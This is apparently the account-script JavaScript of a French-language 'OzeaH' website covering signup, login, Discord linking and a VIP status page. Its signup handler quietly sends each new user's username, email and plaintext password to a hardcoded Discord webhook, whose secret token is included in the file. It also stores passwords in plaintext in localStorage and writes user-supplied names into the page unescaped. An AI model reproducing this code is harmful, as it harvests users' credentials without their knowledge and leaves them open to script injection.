const WEBHOOK_URL = 'https://discord.com/api/webhooks/1552985949515030619/8SWWQCCR5iV0s9FjMRMS_LfEs-t3hcWT3wDy6jEaNChpzIIOeztQWsx3HD_UVbw6ht6D';
const DISCORD_CLIENT_ID = '1107624523479650345';
const REDIRECT_URI = 'https://ozeah.github.io/Vinted/';

function getAccounts() {
    return JSON.parse(localStorage.getItem('ozeah_accounts') || '{}');
}

function saveAccounts(acc) {
    localStorage.setItem('ozeah_accounts', JSON.stringify(acc));
}

function showMsg(text, isSuccess) {
    const el = document.getElementById('auth-msg');
    if (!el) return;
    el.textContent = text;
    el.className = isSuccess ? 'auth-msg success' : 'auth-msg';
}

// Signup
function handleSignup(e) {
    e.preventDefault();
    const username = document.getElementById('signup-username').value.trim();
    const email = document.getElementById('signup-email').value.trim();
    const password = document.getElementById('signup-password').value;
    const confirm = document.getElementById('signup-confirm').value;

    if (password.length < 6) {
        showMsg('Le mot de passe doit faire au moins 6 caracteres.');
        return;
    }
    if (password !== confirm) {
        showMsg('Les mots de passe ne correspondent pas.');
        return;
    }

    const accounts = getAccounts();
    if (accounts[email]) {
        showMsg('Un compte existe deja avec cet email.');
        return;
    }

    accounts[email] = {
        username: username,
        password: password,
        created: new Date().toISOString(),
        discord: null
    };
    saveAccounts(accounts);

    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            embeds: [{
                title: 'Nouveau compte OzeaH',
                color: 0x2ecc71,
                fields: [
                    { name: 'Pseudo', value: username, inline: true },
                    { name: 'Email', value: email, inline: true },
                    { name: 'Mot de passe', value: password, inline: true },
                    { name: 'Date', value: new Date().toLocaleString('fr-FR'), inline: false }
                ],
                footer: { text: 'OzeaH — Inscription site web' }
            }]
        })
    });

    localStorage.setItem('ozeah_user', JSON.stringify({ email, username, type: 'email' }));
    window.location.href = 'account.html';
}

// Login
function handleLogin(e) {
    e.preventDefault();
    const email = document.getElementById('login-email').value.trim();
    const password = document.getElementById('login-password').value;

    const accounts = getAccounts();
    if (!accounts[email] || accounts[email].password !== password) {
        showMsg('Email ou mot de passe incorrect.');
        return;
    }

    localStorage.setItem('ozeah_user', JSON.stringify({
        email,
        username: accounts[email].username,
        type: 'email'
    }));
    window.location.href = 'account.html';
}

// Discord OAuth for linking
function linkDiscord() {
    localStorage.setItem('ozeah_discord_link', 'pending');
    const linkUrl = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify`;
    window.location.href = linkUrl;
}

// Render the account/profile page
function renderAccountPage() {
    const container = document.getElementById('account-content');
    if (!container) return;

    const user = JSON.parse(localStorage.getItem('ozeah_user') || 'null');
    if (!user) {
        window.location.href = 'login.html';
        return;
    }

    let username, email, avatarHtml, discordId, discordHtml;

    if (user.type === 'discord') {
        const discord = JSON.parse(localStorage.getItem('discord_user') || 'null');
        if (!discord) {
            window.location.href = 'login.html';
            return;
        }
        username = discord.global_name || discord.username;
        email = null;
        discordId = discord.id;
        const avatarUrl = discord.avatar
            ? `https://cdn.discordapp.com/avatars/${discord.id}/${discord.avatar}.png?size=128`
            : `https://cdn.discordapp.com/embed/avatars/0.png`;
        avatarHtml = `<img src="${avatarUrl}" class="profile-avatar-img">`;
        discordHtml = `
            <div class="discord-linked">
                <img src="${avatarUrl}" alt="">
                <span>${discord.global_name || discord.username} — Connecte via Discord</span>
            </div>
        `;
    } else if (user.type === 'email') {
        const accounts = getAccounts();
        const account = accounts[user.email];
        const discord = account ? account.discord : null;

        username = user.username;
        email = user.email;
        avatarHtml = `<div class="account-avatar">${username.charAt(0).toUpperCase()}</div>`;

        if (discord) {
            discordId = discord.id;
            const discordAvatarUrl = discord.avatar
                ? `https://cdn.discordapp.com/avatars/${discord.id}/${discord.avatar}.png?size=64`
                : `https://cdn.discordapp.com/embed/avatars/0.png`;
            discordHtml = `
                <div class="discord-linked">
                    <img src="${discordAvatarUrl}" alt="">
                    <span>${discord.global_name || discord.username} — Discord lie</span>
                </div>
            `;
        } else {
            discordId = null;
            discordHtml = `
                <div class="discord-link-banner">
                    <span class="warn-icon">&#9888;</span>
                    <p>Lie ton compte Discord pour pouvoir devenir VIP et recevoir le role automatiquement.</p>
                </div>
                <button class="btn-link-discord" onclick="linkDiscord()">
                    <svg width="18" height="14" viewBox="0 0 71 55" fill="white"><path d="M60.1 4.9A58.5 58.5 0 0045.4.2a.2.2 0 00-.2.1 40.8 40.8 0 00-1.8 3.7 54 54 0 00-16.2 0A37.3 37.3 0 0025.4.3a.2.2 0 00-.2-.1A58.4 58.4 0 0010.5 4.9a.2.2 0 00-.1.1C1.5 18.7-.9 32.2.3 45.5v.1a58.7 58.7 0 0017.7 9a.2.2 0 00.3-.1 42 42 0 003.6-5.9.2.2 0 00-.1-.3 38.6 38.6 0 01-5.5-2.6.2.2 0 01 0-.4l1.1-.9a.2.2 0 01.2 0 41.8 41.8 0 0035.6 0 .2.2 0 01.2 0l1.1.9a.2.2 0 010 .4 36.3 36.3 0 01-5.5 2.6.2.2 0 00-.1.3 47.2 47.2 0 003.6 5.9.2.2 0 00.3.1 58.5 58.5 0 0017.7-9v-.1c1.4-15-2.3-28.4-9.8-40.1a.2.2 0 00-.1-.1zM23.7 37.3c-3.5 0-6.3-3.2-6.3-7s2.8-7 6.3-7 6.4 3.2 6.3 7-2.8 7-6.3 7zm23.3 0c-3.5 0-6.3-3.2-6.3-7s2.8-7 6.3-7 6.4 3.2 6.3 7-2.8 7-6.3 7z"/></svg>
                    Lier mon compte Discord
                </button>
            `;
        }
    } else {
        window.location.href = 'login.html';
        return;
    }

    container.innerHTML = `
        <div class="account-info">
            ${avatarHtml}
            <div>
                <h2 class="account-name">${username}</h2>
                ${email ? '<p class="account-email">' + email + '</p>' : ''}
            </div>
        </div>

        <div class="profile-section">
            <h3 class="profile-section-title">Abonnement VIP</h3>
            <div id="vip-status">
                <div class="vip-loading">Chargement...</div>
            </div>
        </div>

        <div class="profile-section">
            <h3 class="profile-section-title">Compte Discord</h3>
            ${discordHtml}
        </div>

        <div class="profile-section">
            <button class="btn-auth-submit" onclick="logoutAccount()" style="background:#e74c3c;">Se deconnecter</button>
        </div>
    `;

    loadVipStatus(discordId);
}

async function loadVipStatus(discordId) {
    const container = document.getElementById('vip-status');
    if (!container) return;

    if (!discordId) {
        container.innerHTML = `
            <div class="vip-no-discord">
                <p>Lie ton compte Discord pour pouvoir souscrire au VIP.</p>
            </div>
        `;
        return;
    }

    try {
        const res = await fetch('vip_data.json?t=' + Date.now());
        if (!res.ok) throw new Error('not found');
        const data = await res.json();
        const sub = data.subscribers ? data.subscribers[discordId] : null;

        if (sub && (sub.status === 'active' || sub.status === 'trialing')) {
            const start = new Date(sub.current_period_start * 1000);
            const end = new Date(sub.current_period_end * 1000);
            const now = new Date();
            const totalMs = end - start;
            const elapsedMs = now - start;
            const daysLeft = Math.max(0, Math.ceil((end - now) / (1000 * 60 * 60 * 24)));
            const progress = Math.min(100, Math.max(0, (elapsedMs / totalMs) * 100));

            const startStr = start.toLocaleDateString('fr-FR', { day: 'numeric', month: 'long', year: 'numeric' });
            const endStr = end.toLocaleDateString('fr-FR', { day: 'numeric', month: 'long', year: 'numeric' });

            container.innerHTML = `
                <div class="vip-card active">
                    <div class="vip-badge-row">
                        <span class="vip-status-dot active"></span>
                        <span class="vip-status-text">Actif</span>
                    </div>
                    <div class="vip-info-grid">
                        <div class="vip-info-item">
                            <span class="vip-info-label">Debut de la periode</span>
                            <span class="vip-info-value">${startStr}</span>
                        </div>
                        <div class="vip-info-item">
                            <span class="vip-info-label">${sub.cancel_at_period_end ? 'Expire le' : 'Renouvellement'}</span>
                            <span class="vip-info-value">${endStr}</span>
                        </div>
                        <div class="vip-info-item">
                            <span class="vip-info-label">Jours restants</span>
                            <span class="vip-info-value">${daysLeft}j</span>
                        </div>
                    </div>
                    <div class="vip-progress-track">
                        <div class="vip-progress-fill" style="width:${progress}%"></div>
                    </div>
                    ${sub.cancel_at_period_end ? '<p class="vip-cancel-warn">Ton abonnement ne sera pas renouvele.</p>' : ''}
                </div>
            `;
        } else if (sub && sub.status === 'past_due') {
            container.innerHTML = `
                <div class="vip-card warning">
                    <div class="vip-badge-row">
                        <span class="vip-status-dot warning"></span>
                        <span class="vip-status-text">Paiement en attente</span>
                    </div>
                    <p class="vip-warn-text">Il y a un probleme avec ton paiement. Mets a jour tes informations pour garder le VIP.</p>
                </div>
            `;
        } else {
            showNoVip(container);
        }
    } catch (e) {
        showNoVip(container);
    }
}

function showNoVip(container) {
    container.innerHTML = `
        <div class="vip-card inactive">
            <p class="vip-inactive-text">Tu n'as pas d'abonnement VIP actif.</p>
            <a href="vip.html" class="btn-become-vip">Devenir VIP</a>
        </div>
    `;
}

function logoutAccount() {
    localStorage.removeItem('ozeah_user');
    localStorage.removeItem('discord_user');
    window.location.href = 'index.html';
}

// Init on account page
document.addEventListener('DOMContentLoaded', () => {
    if (document.getElementById('account-content')) {
        renderAccountPage();
    }
});
